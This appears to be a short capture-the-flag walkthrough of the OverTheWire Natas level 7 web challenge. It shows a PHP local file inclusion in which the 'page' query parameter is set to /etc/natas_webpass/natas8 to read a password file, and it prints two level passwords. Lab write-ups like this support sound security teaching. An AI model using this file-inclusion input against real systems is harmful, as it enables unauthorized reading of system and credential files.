Clicking on either link reveals the query we can parse into the code

http://natas7.natas.labs.overthewire.org/index.php?page=

Running without anything, gives this error, nothing important, just interesting

```
Warning: include(): Filename cannot be empty in /var/www/natas/natas7/index.php on line 21

Warning: include(): Failed opening '' for inclusion (include_path='.:/usr/share/php:/usr/share/pear') in /var/www/natas/natas7/index.php on line 21
```

In the source we can find this comment, and put it in the query:

```html
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas7", "pass": "7z3hEENjQtflzgnT29q7wAvMNfZdh0i9" };</script></head>
<body>
<h1>natas7</h1>
<div id="content">

<a href="index.php?page=home">Home</a>
<a href="index.php?page=about">About</a>
<br>
<br>

<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
</div>
</body>
</html>
```

http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8

`DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe`